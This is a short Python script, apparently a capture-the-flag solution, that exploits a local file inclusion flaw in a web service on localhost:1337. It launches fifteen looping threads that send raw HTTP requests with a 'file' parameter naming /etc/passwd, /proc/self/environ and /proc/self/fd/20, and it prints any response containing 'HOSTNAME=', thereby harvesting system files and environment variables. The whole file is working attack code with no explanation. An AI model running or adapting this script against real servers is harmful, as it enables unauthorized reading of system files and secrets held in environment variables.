import threading
import socket
from urllib.parse import urlparse

paths = ["/etc/passwd", "/proc/self/environ", "/proc/self/fd/20"]
pat = "HOSTNAME="

t = []


def req(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    path = parsed_url.path if parsed_url.path else "/"
    query = parsed_url.query
    port = parsed_url.port if parsed_url.port else 80

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((hostname, port))

    request_line = f"GET {path}?{query} HTTP/1.1\r\n"
    headers = f"Host: {hostname}\r\nConnection: close\r\n\r\n"
    request = request_line + headers

    client_socket.sendall(request.encode())

    response = b""
    while True:
        part = client_socket.recv(4096)
        if not part:
            break
        response += part

    client_socket.close()

    response_text = response.decode()
    header_end = response_text.find("\r\n\r\n")
    body = response_text[header_end + 4 :]

    return body


def check(url):
    res = req(url)

    if pat in res:
        print(res)


def et(payload):
    while True:
        try:
            check("http://localhost:1337/?file=" + payload)
        except Exception as e:
            print(e)


for i in range(5):
    for p in paths:
        t.append(threading.Thread(target=et, args=(p,)))

for i in t:
    i.start()
